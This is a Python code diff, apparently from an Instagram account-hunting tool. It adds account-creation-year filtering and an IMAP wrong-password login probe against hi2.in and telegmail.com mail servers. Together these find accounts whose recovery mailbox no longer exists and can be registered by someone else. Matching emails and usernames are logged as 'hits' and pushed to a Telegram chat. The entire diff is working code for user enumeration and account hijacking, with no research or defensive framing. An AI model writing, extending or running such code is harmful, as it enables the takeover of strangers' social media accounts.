@@ -1810,13 +1810,102 @@ def _m3_check_v2(email, client):
         resp = client.post(url, data=payload, headers=headers, timeout=10)
         if email in resp.text:
             username = None
+            user_pk  = None
             m = re.search(r'"username"\s*:\s*"([A-Za-z0-9_.]{1,30})"', resp.text)
             if m:
                 username = m.group(1)
-            return ("registered", username)
-        return ("not_registered", None)
+            pk_m = re.search(r'"pk"\s*:\s*"?(\d{6,})"?', resp.text)
+            if pk_m:
+                try:
+                    user_pk = int(pk_m.group(1))
+                except Exception:
+                    pass
+            return ("registered", username, user_pk)
+        return ("not_registered", None, None)
     except Exception:
-        return ("unknown", None)
+        return ("unknown", None, None)
+
+
+_HI2_DOMAINS = {'hi2.in', 'telegmail.com'}
+
+_HI2_IMAP_HOSTS = {
+    'hi2.in':       'mail.hi2.in',
+    'telegmail.com': 'mail.telegmail.com',
+}
+_HI2_IMAP_FALLBACK = {
+    'hi2.in':       'imap.hi2.in',
+    'telegmail.com': 'imap.telegmail.com',
+}
+
+# Words in IMAP error that mean "mailbox does NOT exist" → email is claimable
+_IMAP_AVAIL_WORDS = (
+    'no such', 'user unknown', 'unknown user', 'invalid user',
+    'user not found', 'does not exist', 'not exist',
+    'account not found', 'no account', 'nonexistent',
+    'mailbox not found', 'mailbox unavailable', 'userunknown',
+)
+# Words that mean "wrong password but account EXISTS" → email is taken
+_IMAP_TAKEN_WORDS = (
+    'authenticationfailed', 'authentication failed',
+    'invalid credentials', 'bad credentials',
+    'login failed', 'password', 'credentials rejected',
+    'auth failed',
+)
+
+
+def _m3_email_available(email):
+    """
+    IMAP login-probe check for hi2.in / telegmail.com.
+    Attempts login with a random wrong password on port 993 (IMAPS).
+    - Server says "user unknown / no such user" → mailbox is claimable → True
+    - Server says "authentication failed / bad password" → mailbox exists → False
+    Fails open (True) on any connection / inconclusive error so no real hit is missed.
+    """
+    domain = email.split('@')[1].lower()
+    if domain not in _HI2_DOMAINS:
+        return True
+
+    username = email.split('@')[0]
+    probe_pw = 'weyn_probe_' + secrets.token_hex(6)
+
+    import imaplib
+
+    def _try_imap(host):
+        try:
+            conn = imaplib.IMAP4_SSL(host, 993, timeout=8)
+        except Exception:
+            return None  # connection refused / DNS failure
+        try:
+            conn.login(username, probe_pw)
+            # Extremely unlikely — if login succeeds the mailbox exists
+            try:
+                conn.logout()
+            except Exception:
+                pass
+            return False  # taken
+        except imaplib.IMAP4.error as exc:
+            err = str(exc).lower()
+            try:
+                conn.logout()
+            except Exception:
+                pass
+            if any(w in err for w in _IMAP_AVAIL_WORDS):
+                return True   # available
+            if any(w in err for w in _IMAP_TAKEN_WORDS):
+                return False  # taken
+            return None  # inconclusive
+        except Exception:
+            return None
+
+    primary  = _HI2_IMAP_HOSTS.get(domain)
+    fallback = _HI2_IMAP_FALLBACK.get(domain)
+
+    result = _try_imap(primary) if primary else None
+    if result is None and fallback:
+        result = _try_imap(fallback)
+
+    # None = inconclusive / unreachable → fail open
+    return True if result is None else result
 
 
 def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
@@ -1831,7 +1920,8 @@ def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
         _m3_total += 1
         hit_num    = _m3_hits
 
-    profile_line = f"LINK   : https://www.instagram.com/{username}\n" if username else ""
+    profile_url  = f"https://www.instagram.com/{username}" if username else ""
+    profile_line = f"PROFILE: {profile_url}\n" if profile_url else ""
     msg = (
         f"WEYN M3 — {domain}\n"
         f"HIT #{hit_num}\n"
@@ -1846,7 +1936,7 @@ def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
 
     _save_hit_to_file(msg)
 
-    entry = json.dumps({"e": email, "m": method_label})
+    entry = json.dumps({"e": email, "m": method_label, "u": username or ""})
     with _m3_found_lock:
         _m3_found_emails.append(entry)
         if len(_m3_found_emails) > 200:
@@ -1859,14 +1949,34 @@ def _m3_save_hit(token, chat_id, email, method_label="V1", username=None):
     _send_telegram(token, chat_id, msg)
 
 
-def _m3_worker(token, chat_id, stop_event):
+def _m3_worker(token, chat_id, stop_event, year_choice=None):
     global _m3_good_insta, _m3_bad_insta, _m3_bad_email, _m3_scanned
+    global _m3_taken
 
     # One persistent HTTP/2 client per worker — reused across all emails
     try:
         client = httpx.Client(http2=True, timeout=10)
     except Exception:
         client = httpx.Client(timeout=10)
+
+    def _year_ok(user_pk):
+        """Return True if this account's creation year matches the filter."""
+        if year_choice is None:
+            return True
+        if user_pk is None:
+            return True  # no pk extracted — don't block the hit
+        return gdate(user_pk) == year_choice
+
+    def _try_save(email, label, username, user_pk):
+        """Check year + email availability then save or count as taken."""
+        if not _year_ok(user_pk):
+            return  # year mismatch — silently skip (counted as bad_insta below)
+        if _m3_email_available(email):
+            _m3_save_hit(token, chat_id, email, label, username)
+        else:
+            global _m3_taken
+            _m3_taken += 1
+            _web_state['taken'] = _m3_taken
 
     try:
         while not (stop_event and stop_event.is_set()):
@@ -1893,12 +2003,12 @@ def _m3_worker(token, chat_id, stop_event):
                     result_v1 = _m3_check_v1(email, client)
 
                     if result_v1 == "registered":
-                        # Confirm with V2 — also extracts username
-                        v2_status, username = _m3_check_v2(email, client)
+                        # Confirm with V2 — also extracts username + pk
+                        v2_status, username, user_pk = _m3_check_v2(email, client)
                         if v2_status == "registered":
                             _m3_good_insta += 1
                             _web_state['good'] = _m3_good_insta
-                            _m3_save_hit(token, chat_id, email, "V1", username)
+                            _try_save(email, "V1", username, user_pk)
                         elif v2_status == "not_registered":
                             _m3_bad_insta += 1
                             _web_state['bad_insta'] = _m3_bad_insta
@@ -1906,14 +2016,14 @@ def _m3_worker(token, chat_id, stop_event):
                             # V2 inconclusive — trust V1
                             _m3_good_insta += 1
                             _web_state['good'] = _m3_good_insta
-                            _m3_save_hit(token, chat_id, email, "V1", username)
+                            _try_save(email, "V1", username, user_pk)
 
                     elif result_v1 == "check_v2":
-                        v2_status, username = _m3_check_v2(email, client)
+                        v2_status, username, user_pk = _m3_check_v2(email, client)
                         if v2_status == "registered":
                             _m3_good_insta += 1
                             _web_state['good'] = _m3_good_insta
-                            _m3_save_hit(token, chat_id, email, "V2", username)
+                            _try_save(email, "V2", username, user_pk)
                         elif v2_status == "unknown":
                             _m3_bad_email += 1
                             _web_state['bad_email'] = _m3_bad_email
@@ -1938,7 +2048,7 @@ def _m3_worker(token, chat_id, stop_event):
             pass
 
 
-def run_method3_web(token, chat_id, stop_event):
+def run_method3_web(token, chat_id, stop_event, year_choice=None):
     global _m3_hits, _m3_good_insta, _m3_bad_insta, _m3_bad_email
     global _m3_taken, _m3_limit, _m3_total, _m3_scanned
     global _m3_found_emails, _m3_pool, _m3_used_emails
@@ -1961,7 +2071,7 @@ def run_method3_web(token, chat_id, stop_event):
         pool = ThreadPoolExecutor(max_workers=NUM_WORKERS)
         _m3_pool = pool
         futures = [
-            pool.submit(_m3_worker, token, chat_id, stop_event)
+            pool.submit(_m3_worker, token, chat_id, stop_event, year_choice)
             for _ in range(NUM_WORKERS)
         ]
         for future in as_completed(futures):
